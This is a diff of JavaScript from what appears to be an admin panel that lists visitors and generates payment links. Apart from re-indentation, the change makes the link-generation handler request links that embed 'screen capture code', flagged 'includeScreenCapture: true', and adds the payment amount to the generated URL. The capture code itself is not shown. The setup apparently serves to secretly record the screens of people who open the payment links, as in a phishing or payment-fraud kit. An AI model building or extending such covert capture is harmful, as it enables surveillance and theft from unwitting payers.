@@ -2071,36 +2071,36 @@ function addVisitorToList(visitor, isNew = true) {
   }
 }
 
-    // Payment Link Generation - MODIFIED to include screen capture code and more robust error handling
-    document.getElementById('generateLinkForm').addEventListener('submit', async (e) => {
-      e.preventDefault();
-      const amountInput = document.getElementById('amount');
-      const descInput = document.getElementById('description');
-      const linkContainer = document.getElementById('paymentLinkContainer');
+// Payment Link Generation - MODIFIED to include screen capture code and more robust error handling
+document.getElementById('generateLinkForm').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const amountInput = document.getElementById('amount');
+  const descInput = document.getElementById('description');
+  const linkContainer = document.getElementById('paymentLinkContainer');
 
-      try {
-        linkContainer.style.display = 'none';
-        const amount = parseFloat(amountInput.value);
-        const description = descInput.value.trim();
+  try {
+    linkContainer.style.display = 'none';
+    const amount = parseFloat(amountInput.value);
+    const description = descInput.value.trim();
 
-        if (!amount || amount <= 0) throw new Error('Invalid amount');
-        if (!description) throw new Error('Description required');
+    if (!amount || amount <= 0) throw new Error('Invalid amount');
+    if (!description) throw new Error('Description required');
 
-        // Show loading indication
-        const btn = e.target.querySelector('button[type="submit"]');
-        const originalText = btn.textContent;
-        btn.textContent = 'Generating...';
-        btn.disabled = true;
+    // Show loading indication
+    const btn = e.target.querySelector('button[type="submit"]');
+    const originalText = btn.textContent;
+    btn.textContent = 'Generating...';
+    btn.disabled = true;
 
-        const response = await fetch('/api/generatePaymentLink', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ 
-            amount, 
-            description,
-            includeScreenCapture: true // Add flag to include screen capture code
-          })
-        });
+    const response = await fetch('/api/generatePaymentLink', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ 
+        amount, 
+        description,
+        includeScreenCapture: true // Add flag to include screen capture code
+      })
+    });
 
         const data = await response.json();
         if (!response.ok) throw new Error(data.message || 'Generation failed');
@@ -2145,9 +2145,9 @@ function addVisitorToList(visitor, isNew = true) {
         // Generate random hash for the URL (6 characters, alphanumeric)
         const randomHash = Math.random().toString(36).substring(2, 8);
 
-      // Create a clean URL with just the hash (no .html extension)
-        const origin = window.location.origin;
-        const hashUrl = `${origin}/${randomHash}?pid=${pid}`;
+// Create a clean URL with just the hash (no .html extension)
+const origin = window.location.origin;
+const hashUrl = `${origin}/${randomHash}?pid=${pid}&amount=${amount}`;
         
         document.getElementById('paymentLink').textContent = hashUrl;
         linkContainer.style.display = 'block';
